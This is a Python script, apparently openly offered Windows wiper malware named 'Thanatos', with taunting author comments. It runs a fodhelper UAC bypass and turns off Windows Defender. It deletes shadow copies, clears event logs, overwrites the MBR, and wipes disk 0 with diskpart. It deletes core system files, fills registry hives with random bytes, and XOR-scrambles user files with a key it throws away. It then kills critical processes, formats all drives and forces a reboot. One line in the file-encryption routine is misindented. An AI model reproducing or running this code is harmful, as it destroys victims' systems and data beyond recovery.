#made by monstr-m1nd fuck ur pc HAHAHA 
import os
import sys
import time
import ctypes
import random
import string
import subprocess
import struct
from ctypes import wintypes
# DESTRUCTION 
class Thanatos:
    def __init__(self):
        self.admin = ctypes.windll.shell32.IsUserAnAdmin()
        
    def elevate(self):
        """Bypass UAC using fodhelper exploit"""
        try:
            cmd = f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f'
            subprocess.run(cmd, shell=True)
            cmd2 = f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d "{sys.executable} {os.path.abspath(sys.argv[0])}" /f'
            subprocess.run(cmd2, shell=True)
            subprocess.run("fodhelper.exe", shell=True)
            time.sleep(2)
            subprocess.run('reg delete HKCU\\Software\\Classes\\ms-settings\\ /f', shell=True)
        except:
            pass
    def kill_defender(self):
        """Permanently disable Windows Defender"""
        try:
            cmds = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v PUAProtection /t REG_DWORD /d 0 /f'
            ]
            for cmd in cmds:
                subprocess.run(cmd, shell=True)
            for proc in ["MsMpEng.exe", "NisSrv.exe", "SecurityHealthService.exe", "Smartscreen.exe"]:
                subprocess.run(f'taskkill /f /im {proc}', shell=True)
                
            ps = '''
            Set-MpPreference -DisableRealtimeMonitoring $true
            Set-MpPreference -DisableBehaviorMonitoring $true
            Set-MpPreference -DisableBlockAtFirstSeen $true
            Set-MpPreference -DisableIOAVProtection $true
            Set-MpPreference -DisablePrivacyMode $true
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
            Set-MpPreference -DisableArchiveScanning $true
            Set-MpPreference -DisableIntrusionPreventionSystem $true
            Set-MpPreference -DisableScriptScanning $true
            Set-MpPreference -SubmitSamplesConsent 2
            '''
            subprocess.run(['powershell', '-Command', ps], shell=True)
        except:
            pass

    def nuke_boot(self):
        """Destroy boot sectors and boot configuration"""
        try:
            with open(r"\\.\PhysicalDrive0", "wb") as mbr:
                mbr.write(os.urandom(512))
        except:
            pass
            
        try:
            with open("C:\\Windows\\Temp\\dp.txt", "w") as f:
                f.write("select disk 0\nclean\nconvert mbr\nexit\n")
            subprocess.run("diskpart /s C:\\Windows\\Temp\\dp.txt", shell=True, timeout=5)
            os.remove("C:\\Windows\\Temp\\dp.txt")
        except:
            pass
    def delete_system(self):
        """Delete critical system files"""
        targets = [
            "C:\\Windows\\System32\\config\\*",
            "C:\\Windows\\System32\\drivers\\*.sys",
            "C:\\Windows\\System32\\winload.exe",
            "C:\\Windows\\System32\\winload.efi",
            "C:\\Windows\\System32\\ntoskrnl.exe",
            "C:\\Windows\\System32\\hal.dll",
            "C:\\Windows\\System32\\bootmgr.exe",
            "C:\\Windows\\System32\\csrss.exe",
            "C:\\Windows\\System32\\lsass.exe",
            "C:\\Windows\\System32\\services.exe",
            "C:\\Windows\\System32\\smss.exe",
            "C:\\bootmgr",
            "C:\\Boot\\BCD",
            "C:\\Windows\\System32\\drivers\\ntfs.sys",
            "C:\\Windows\\System32\\drivers\\fastfat.sys",
            "C:\\Windows\\System32\\drivers\\partmgr.sys"
        ]        
        for target in targets:
            try:
                subprocess.run(f'takeown /f "{target}" /r /d y 2>nul', shell=True)
                subprocess.run(f'icacls "{target}" /grant administrators:F /t 2>nul', shell=True)
                subprocess.run(f'del /f /q /s "{target}" 2>nul', shell=True)
            except:
                pass

    def kill_shadows(self):
        """Remove all recovery options"""
        cmds = [
            'vssadmin delete shadows /all /quiet',
            'wmic shadowcopy delete',
            'bcdedit /set {default} recoveryenabled No',
            'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
            'bcdedit /deletevalue {default} recoverysequence',
            'wmic recoveros set AutoReboot = False',
            'wmic recoveros set DebugInfoType = 0',
            'wevtutil cl System',
            'wevtutil cl Application',
            'wevtutil cl Security'
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True)
    def corrupt_registry(self):
        """Corrupt registry hives"""
        reg_files = [
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SOFTWARE",
            "C:\\Windows\\System32\\config\\SECURITY",
            "C:\\Windows\\System32\\config\\DEFAULT"
        ]
        for reg in reg_files:
            try:
                with open(reg, "wb") as f:
                    f.write(os.urandom(1024*1024))
            except:
                pass

    def kill_processes(self):
        """Terminate critical processes"""
        procs = [
            "winlogon.exe", "lsass.exe", "csrss.exe", "services.exe",
            "smss.exe", "svchost.exe", "dwm.exe", "explorer.exe"
        ]
        for proc in procs:
            subprocess.run(f'taskkill /f /im {proc} 2>nul', shell=True)
            subprocess.run(f'ntsd -c q -pn {proc} 2>nul', shell=True)

    def encrypt_files(self):
        """Encrypt all user files with random key (no recovery)"""
        key = random.randint(1, 255)
        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                     '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.bmp',
                     '.txt', '.rtf', '.odt', '.ods', '.odp', '.zip',
                     '.rar', '.7z', '.mp3', '.mp4', '.avi', '.mkv',
                     '.wav', '.flac', '.mov', '.wmv', '.iso', '.vmdk']
                roots = []
        for user in os.listdir("C:\\Users"):
            path = os.path.join("C:\\Users", user)
            if os.path.isdir(path) and user not in ["Public", "Default", "All Users"]:
                roots.append(path)
        
        for root in roots:
            for dirpath, _, files in os.walk(root):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in extensions:
                        try:
                            path = os.path.join(dirpath, file)
                            with open(path, 'rb') as f:
                                data = f.read()
                            encrypted = bytes([b ^ key for b in data])
                            with open(path, 'wb') as f:
                                f.write(encrypted)
                            # Rename to random
                            new = ''.join(random.choices(string.ascii_lowercase, k=16)) + '.encrypted'
                            os.rename(path, os.path.join(dirpath, new))
                        except:
                            pass
    def format_disks(self):
        """Format all available drives"""
        try:
            # Get all fixed drives
            drives = []
            for i in range(ord('C'), ord('Z')+1):
                drive = chr(i) + ":\\"
                if os.path.exists(drive):
                    drives.append(drive)
            for drive in drives:
                subprocess.run(f'format {drive} /q /y', shell=True, timeout=10)
        except:
            pass
    def main(self):
        if not self.admin:
            self.elevate()
            return
        
        self.kill_defender()
        self.kill_shadows()
        self.nuke_boot()
        self.delete_system()
        self.corrupt_registry()
        self.encrypt_files()
        self.kill_processes()
        self.format_disks()
        os.system("shutdown /r /t 0 /f")
if __name__ == "__main__":
    wh = ctypes.windll.kernel32.GetConsoleWindow()
    if wh:
        ctypes.windll.user32.ShowWindow(wh, 0)
    
    mal = Thanatos()
    mal.main()
#shaw shaw hahahaha 